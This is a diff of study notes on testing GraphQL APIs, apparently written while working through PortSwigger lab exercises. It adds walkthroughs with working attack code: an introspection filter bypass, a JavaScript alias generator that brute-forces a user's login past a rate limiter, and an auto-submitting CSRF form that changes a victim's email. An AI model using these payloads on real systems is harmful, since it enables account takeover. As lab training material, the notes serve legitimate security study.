@@ -1,301 +1,5 @@
-### How GraphQL works
-GraphQL schemas define the structure of the service's data, listing the available objects (known as types), fields, and relationships.
-
-The data described by a GraphQL schema can be manipulated using three types of operation:
-- Queries fetch data.
-- Mutations add, change, or remove data.
-- Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.
-
-###  What is a GraphQL schema?
-In GraphQL, the schema represents a contract between the frontend and backend of the service. It defines the data available as a series of types, using a human-readable schema definition language. These types can then be implemented by a service.
-
-Most of the types defined are object types, which define the objects available and the fields and arguments they have. Each field has its own type, which can either be another object or a scalar, enum, union, interface, or custom type.
-
-The example below shows a simple schema definition for a Product type. The ! operator indicates that the field is non-nullable when called (that is, mandatory). 
-```bash
-    #Example schema definition
-
-    type Product {
-        id: ID!
-        name: String!
-        description: String!
-        price: Int
-    }
-```
-
-### What are GraphQL queries?
-GraphQL queries retrieve data from the data store. They are roughly equivalent to GET requests in a REST API.
-
-Queries usually have the following key components:
-- A query operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
-- A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
-- A data structure. This is the data that the query should return.
-- Optionally, one or more arguments. These are used to create queries that return details of a specific object (for example "give me the name and description of the product that has the ID 123").
-
-The example below shows a query called myGetProductQuery that requests the name, and description fields of a product with the id of 123.
-```bash
-    #Example query
-
-    query myGetProductQuery {
-        getProduct(id: 123) {
-            name
-            description
-        }
-    }
-```
-
-### What are GraphQL mutations?
-Mutations change data in some way, either adding, deleting, or editing it. They are roughly equivalent to a REST API's POST, PUT, and DELETE methods.
-
-Like queries, mutations have an operation type, name, and structure for the returned data. However, mutations always take an input of some type. This can be an inline value, but in practice is generally provided as a variable.
-
-The example below shows a mutation to create a new product and its associated response. In this case, the service is configured to automatically assign an ID to new products, which has been returned as requested.
-```bash
-    #Example mutation request
-
-    mutation {
-        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
-            id
-            name
-            listed
-        }
-    }
-```
-```bash
-    #Example mutation response
-
-    {
-        "data": {
-            "createProduct": {
-                "id": 123,
-                "name": "Flamin' Cocktail Glasses",
-                "listed": "yes"
-            }
-        }
-    }
-```
-
-### Components of queries and mutations
-The GraphQL syntax includes several common components for queries and mutations.
-
-### Fields
-All GraphQL types contain items of queryable data called fields. When you send a query or mutation, you specify which of the fields you want the API to return. The response mirrors the content specified in the request.
-
-The example below shows a query to get ID and name details for all employees, and its associated response. In this case, id, name.firstname, and name.lastname are the fields requested.
-```bash
-    #Request
-
-    query myGetEmployeeQuery {
-        getEmployees {
-            id
-            name {
-                firstname
-                lastname
-            }
-        }
-    }
-```
-```bash
-    #Response
-
-    {
-        "data": {
-            "getEmployees": [
-                {
-                    "id": 1,
-                    "name" {
-                        "firstname": "Carlos",
-                        "lastname": "Montoya"
-                    }
-                },
-                {
-                    "id": 2,
-                    "name" {
-                        "firstname": "Peter",
-                        "lastname": "Wiener"
-                    }
-                }
-            ]
-        }
-    }
-```
-
-### Arguments
-Arguments are values that are provided for specific fields. The arguments that can be accepted for a type are defined in the schema.
-
-When you send a query or mutation that contains arguments, the GraphQL server determines how to respond based on its configuration. For example, it might return a specific object rather than details of all objects.
-
-The example below shows a getEmployee request that takes an employee ID as an argument. In this case, the server responds with only the details of the employee who matches that ID.
-```bash
-    #Example query with arguments
-
-    query myGetEmployeeQuery {
-        getEmployees(id:1) {
-            name {
-                firstname
-                lastname
-            }
-        }
-    }
-```
-```bash
-    #Response to query
-
-    {
-        "data": {
-            "getEmployees": [
-            {
-                "name" {
-                    "firstname": Carlos,
-                    "lastname": Montoya
-                    }
-                }
-            ]
-        }
-    }
-```
-
-### Variables
-Variables enable you to pass dynamic arguments, rather than having arguments directly within the query itself.
-
-Variable-based queries use the same structure as queries using inline arguments, but certain aspects of the query are taken from a separate JSON-based variables dictionary. They enable you to reuse a common structure among multiple queries, with only the value of the variable itself changing.
-
-When building a query or mutation that uses variables, you need to:
-- Declare the variable and type.
-- Add the variable name in the appropriate place in the query.
-- Pass the variable key and value from the variable dictionary.
-
-The example below shows the same query as in the previous example, but with the ID passed as a variable instead of as a direct part of the query string. 
-
-```bash
-    #Example query with variable
-
-    query getEmployeeWithVariable($id: ID!) {
-        getEmployees(id:$id) {
-            name {
-                firstname
-                lastname
-            }
-         }
-    }
-
-    Variables:
-    {
-        "id": 1
-    }
-```
-In this example, the variable is declared in the first line with ($id: ID!). The ! indicates that this is a required field for this query. It is then used as an argument in the second line with (id:$id). Finally, the value of the variable itself is set in the variable JSON dictionary.
-
-### Aliases
-GraphQL objects can't contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.
-```bash
-    #Invalid query
-
-    query getProductDetails {
-        getProduct(id: 1) {
-            id
-            name
-        }
-        getProduct(id: 2) {
-            id
-            name
-        }
-    }
-```
-
-Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. This helps to reduce the number of API calls needed.
-
-In the example below, the query uses aliases to specify a unique name for both products. This query now passes validation, and the details are returned.
-```bash
-    #Valid query using aliases
-
-    query getProductDetails {
-        product1: getProduct(id: "1") {
-            id
-            name
-        }
-        product2: getProduct(id: "2") {
-            id
-            name
-        }
-    }
-```
-```bash
-    #Response to query
-
-    {
-        "data": {
-            "product1": {
-                "id": 1,
-                "name": "Juice Extractor"
-             },
-            "product2": {
-                "id": 2,
-                "name": "Fruit Overlays"
-            }
-        }
-    }
-```
-
-###  Fragments
-Fragments are reusable parts of queries or mutations. They contain a subset of the fields belonging to the associated type.
-
-Once defined, they can be included in queries or mutations. If they are subsequently changed, the change is included in every query or mutation that calls the fragment.
-
-The example below shows a getProduct query in which the details of the product are contained in a productInfo fragment. 
-```bash
-    #Example fragment
-
-    fragment productInfo on Product {
-        id
-        name
-        listed
-    }
-```
-```bash
-    #Query calling the fragment
-
-    query {
-        getProduct(id: 1) {
-            ...productInfo
-            stock
-        }
-    }
-```
-```bash
-    #Response including fragment fields
-
-    {
-        "data": {
-            "getProduct": {
-                "id": 1,
-                "name": "Juice Extractor",
-                "listed": "no",
-                "stock": 5
-            }
-        }
-    }
-```
-
-### Subscriptions
-Subscriptions are a special type of query. They enable clients to establish a long-lived connection with a server so that the server can then push real-time updates to the client without the need to continually poll for data. They are primarily useful for small changes to large objects and for functionality that requires small real-time updates (like chat systems or collaborative editing).
-
-As with regular queries and mutations, the subscription request defines the shape of the data to be returned.
-
-Subscriptions are commonly implemented using WebSockets. 
-
-
-### Introspection
-Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.
-
-Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.
-
-Introspection can represent a serious information disclosure risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.
-
-
 ### GraphQL in burp:
 https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql
-
 
 ### Finding GraphQL endpoints
 Before you can test a GraphQL API, you first need to find its endpoint. As GraphQL APIs use the same endpoint for all requests, this is a valuable piece of information. 
@@ -316,6 +20,7 @@ GraphQL services often use similar endpoint suffixes. When testing for GraphQL e
 If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path.
 
 > Note:
+>
 > GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.
 
 ### Request methods
@@ -323,7 +28,7 @@ The next step in trying to find GraphQL endpoints is to test using different req
 
 It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of application/json, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of x-www-form-urlencoded.
 
-If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods. 
+If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.
 
 ### Exploiting unsanitized arguments
 At this point, you can start to look for vulnerabilities. Testing query arguments is a good place to start.
@@ -398,7 +103,7 @@ By querying the ID of the missing product, we can get its details, even though i
     }
 ```
 
-###  Discovering schema information
+### Discovering schema information
 The next step in testing the API is to piece together information about the underlying schema.
 
 The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.
@@ -411,7 +116,8 @@ To use introspection to discover schema information, query the __schema field. T
 Like regular queries, you can specify the fields and structure of the response you want to be returned when running an introspection query. For example, you might want the response to contain only the names of available mutations.
 
 > Note
-> Burp can generate introspection queries for you. For more information, see Accessing GraphQL API schemas using introspection.
+>
+> Burp can generate introspection queries for you. For more information, see [Accessing GraphQL API schemas using introspection](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql#accessing-graphql-api-schemas-using-introspection).
 
 ### Probing for introspection 
 It is best practice for introspection to be disabled in production environments, but this advice is not always followed.
@@ -526,7 +232,7 @@ The example query below returns full details on all queries, mutations, subscrip
 ### Visualizing introspection results
 Responses to introspection queries can be full of information, but are often very long and hard to process.
 
-You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/) tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types. 
+You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer) tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types. 
 
 ### Suggestions
 Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.
@@ -535,12 +241,13 @@ Suggestions are a feature of the Apollo GraphQL platform in which the server can
 
 You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.
 
-Clairvoyance is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.
+[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.
 
-You cannot disable suggestions directly in Apollo. See this GitHub thread for a workaround.
-Note
+You cannot disable suggestions directly in Apollo. See this [GitHub thread](https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305) for a workaround.
 
-Burp Scanner can automatically test for suggestions as part of its scans. If active suggestions are found, Burp Scanner reports a "GraphQL suggestions enabled" issue.
+> Note:
+>
+> Burp Scanner can automatically test for suggestions as part of its scans. If active suggestions are found, Burp Scanner reports a "GraphQL suggestions enabled" issue.
 
 ### APPRENTICE Lab: Accessing private GraphQL posts
 To figure out if the endpoint corresponds to a graphsql endpoint first try to send universal query
@@ -826,420 +533,7 @@ Now we get far better result in the resp, but it's really long so only paste the
               "isDeprecated": false,
               "deprecationReason": null
             },
-            {
-              "name": "image",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "String",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "title",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "String",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "author",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "String",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "date",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "Timestamp",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "summary",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "String",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "paragraphs",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "LIST",
-                  "name": null,
-                  "ofType": {
-                    "kind": "NON_NULL",
-                    "name": null,
-                    "ofType": {
-                      "kind": "SCALAR",
-                      "name": "String"
-                    }
-                  }
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "isPrivate",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "Boolean",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "postPassword",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "SCALAR",
-                "name": "String",
-                "ofType": null
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            }
-          ],
-          "inputFields": null,
-          "interfaces": [],
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "SCALAR",
-          "name": "Boolean",
-          "description": "Built-in Boolean",
-          "fields": null,
-          "inputFields": null,
-          "interfaces": null,
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "SCALAR",
-          "name": "Int",
-          "description": "Built-in Int",
-          "fields": null,
-          "inputFields": null,
-          "interfaces": null,
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "SCALAR",
-          "name": "String",
-          "description": "Built-in String",
-          "fields": null,
-          "inputFields": null,
-          "interfaces": null,
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "SCALAR",
-          "name": "Timestamp",
-          "description": "Timestamp scalar",
-          "fields": null,
-          "inputFields": null,
-          "interfaces": null,
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "OBJECT",
-          "name": "__Directive",
-          "description": null,
-          "fields": [
-            {
-              "name": "name",
-              "description": "The __Directive type represents a Directive that a server supports.",
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "String",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "description",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "SCALAR",
-                "name": "String",
-                "ofType": null
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "isRepeatable",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "SCALAR",
-                  "name": "Boolean",
-                  "ofType": null
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "locations",
-              "description": null,
-              "args": [],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "LIST",
-                  "name": null,
-                  "ofType": {
-                    "kind": "NON_NULL",
-                    "name": null,
-                    "ofType": {
-                      "kind": "ENUM",
-                      "name": "__DirectiveLocation"
-                    }
-                  }
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "args",
-              "description": null,
-              "args": [
-                {
-                  "name": "includeDeprecated",
-                  "description": null,
-                  "type": {
-                    "kind": "SCALAR",
-                    "name": "Boolean",
-                    "ofType": null
-                  },
-                  "defaultValue": "false"
-                }
-              ],
-              "type": {
-                "kind": "NON_NULL",
-                "name": null,
-                "ofType": {
-                  "kind": "LIST",
-                  "name": null,
-                  "ofType": {
-                    "kind": "NON_NULL",
-                    "name": null,
-                    "ofType": {
-                      "kind": "OBJECT",
-                      "name": "__InputValue"
-                    }
-                  }
-                }
-              },
-              "isDeprecated": false,
-              "deprecationReason": null
-            }
-          ],
-          "inputFields": null,
-          "interfaces": [],
-          "enumValues": null,
-          "possibleTypes": null
-        },
-        {
-          "kind": "ENUM",
-          "name": "__DirectiveLocation",
-          "description": "An enum describing valid locations where a directive can be placed",
-          "fields": null,
-          "inputFields": null,
-          "interfaces": null,
-          "enumValues": [
-            {
-              "name": "QUERY",
-              "description": "Indicates the directive is valid on queries.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "MUTATION",
-              "description": "Indicates the directive is valid on mutations.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "SUBSCRIPTION",
-              "description": "Indicates the directive is valid on subscriptions.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "FIELD",
-              "description": "Indicates the directive is valid on fields.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "FRAGMENT_DEFINITION",
-              "description": "Indicates the directive is valid on fragment definitions.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "FRAGMENT_SPREAD",
-              "description": "Indicates the directive is valid on fragment spreads.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "INLINE_FRAGMENT",
-              "description": "Indicates the directive is valid on inline fragments.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "VARIABLE_DEFINITION",
-              "description": "Indicates the directive is valid on variable definitions.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "SCHEMA",
-              "description": "Indicates the directive is valid on a schema SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "SCALAR",
-              "description": "Indicates the directive is valid on a scalar SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "OBJECT",
-              "description": "Indicates the directive is valid on an object SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "FIELD_DEFINITION",
-              "description": "Indicates the directive is valid on a field SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "ARGUMENT_DEFINITION",
-              "description": "Indicates the directive is valid on a field argument SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "INTERFACE",
-              "description": "Indicates the directive is valid on an interface SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "UNION",
-              "description": "Indicates the directive is valid on an union SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "ENUM",
-              "description": "Indicates the directive is valid on an enum SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "ENUM_VALUE",
-              "description": "Indicates the directive is valid on an enum value SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "INPUT_OBJECT",
-              "description": "Indicates the directive is valid on an input object SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            },
-            {
-              "name": "INPUT_FIELD_DEFINITION",
-              "description": "Indicates the directive is valid on an input object field SDL definition.",
-              "isDeprecated": false,
-              "deprecationReason": null
-            }
-          ],
-          "possibleTypes": null
-        },
+            ...
 ...
 ```
 So let's use [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/) for the results of introspection:
@@ -1251,7 +545,6 @@ And in the visualised result we see the Schema of the BlogPost
 And we see that it contains `postPassword`
 So we make a req with that `postPassword`:
 ```bash
-
     query getBlogPost($id: Int!) {
         getBlogPost(id: $id) {
             image
@@ -1294,7 +587,7 @@ And in the result we see:
 ```
 
 ### PRACTITIONER Lab: Accidental exposure of private GraphQL fields
-In the lab we see login mutation, let's send to repeater:
+In the lab we see login mutation, let's send it to repeater:
 ```bash
     mutation login($input: LoginInput!) {
         login(input: $input) {
@@ -1338,11 +631,11 @@ We get resp:
 ```
 
 ### Bypassing GraphQL introspection defenses 
-If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.
+If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.
 
-When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.
+When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.
 
-As such, if the developer has only excluded __schema{, then the below introspection query would not be excluded. 
+As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded. 
 ```bash
     #Introspection query with newline
 
@@ -1362,7 +655,10 @@ The example below shows an introspection probe sent via GET, with URL-encoded pa
     GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
 ```
 
-### PRACTITIONER Lab: Finding a hidden GraphQL endpoint
+### PRACTITIONER Lab: Finding a hidden GraphQL endpoint (includes bypassing introspection defenses)
+Lab description:
+The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.
+
 When we go through endpoints we don't see an endpoint for GraphQL, so we use Intruder to try to find it:
 ```bash
 GET §/api§ HTTP/2
@@ -1391,7 +687,8 @@ We see a lot of 404 responses but one of them is 400 which is the response of `/
 ```
 
 So we send it to repeater and change the req method to POST and see that it's not allowed.
-So we try:
+
+Therefore we use GET method and try to send the simplest query possible (also known as universal query):
 ```bash
 GET /api?query=query{__typename} HTTP/2
 ```
@@ -1405,7 +702,65 @@ And in the response we get:
 }
 ```
 
-TODO: stopped
+So we can send graphql queries now, let us now try to use the introspection query:
+We copy the same request with the universal query and In the new tab of the repeater, right click > GraphQL > Set introspection query > Send
+```bash
+GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema+%7b%0a++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType...
+```
+Or the simplified version of introspection query:
+```bash
+GET /api?query=query%7b__schema%7bqueryType%7bname%7d%7d%7d HTTP/2
+```
+Which is url decoded as:
+```bash
+query=query{__schema{queryType{name}}}
+```
+
+In the reponse we get:
+```bash
+{
+  "errors": [
+    {
+      "locations": [],
+      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
+    }
+  ]
+}
+```
+
+As we can see the introspection query is not allowed. Let us now try to bypass that (see Bypassing GraphQL introspection defenses)
+So we try the following (adding new line after `__schema`):
+```bash
+GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/2
+```
+which is url decoded as:
+```bash
+query{__schema
+{queryType{name}}}
+```
+And in the response we get:
+```bash
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "name": "query"
+      }
+    }
+  }
+}
+```
+Which means we can now get the full introspection query result by using the same bypass technique (adding new line character after `__schema`):
+```bash
+GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema%0A%7BqueryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType...
+```
+In the response we get the result of the introspection query and we can do:
+In burp right click on the response > GraphQL > Save GraphQL queries to Site map
+
+And also:
+http://nathanrandal.com/graphql-visualizer
+
+In the burp sitemap we see there's a mutation for deleting users and a query for getting users. So we get user carlos by specifying the `id=3` and we delete the user carlos and the lab is solved
 
 ### Bypassing rate limiting using aliases 
 While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint.
@@ -1431,6 +786,73 @@ The simplified example below shows a series of aliased queries checking whether 
 ```
 
 ### PRACTITIONER Lab: Bypassing GraphQL brute force protections
+Lab description:
+The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
+To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source. 
 
+js script that creates aliases (taken from the lab tip, and is meant to be run in browser's console):
+```bash
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+```
 
+The result is copied to the clipboard, let us paste it into the repeater and send it to the backend server to see which password worked for the username carlos. Once found login and the lab is solved
+
+### GraphQL CSRF 
+### How do CSRF over GraphQL vulnerabilities arise? 
+CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.
+
+POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.
+
+However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API. 
+
+### PRACTITIONER Lab: Performing CSRF exploits over GraphQL
+First send email change endpoint to the repeater
+
+Convert the request into a POST request with a Content-Type of x-www-form-urlencoded. To do this, right-click the request and select Change request method **twice**.
+
+Notice that the mutation request body has been deleted. Add the request body back in with URL encoding
+
+Original request body (json):
+```bash
+{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"ff2@ff.com"}}}
+```
+
+Url encoded req body (req body was copied from the Graphql tab and it was url encoded and then it was prefixed with `qeury=`):
+```bash
+query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
+```
+Which can be url decoded as:
+```bash
+query=
+    mutation changeEmail($input: ChangeEmailInput!) {
+        changeEmail(input: $input) {
+            email
+        }
+    }
+&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
+```
+
+Now generate html for the csrf attack and send it to the victim:
+```bash
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0ab9001703706700803b088f0053000c.web-security-academy.net/graphql/v1" method="POST">
+      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
+      <input type="hidden" name="operationName" value="changeEmail" />
+      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
 
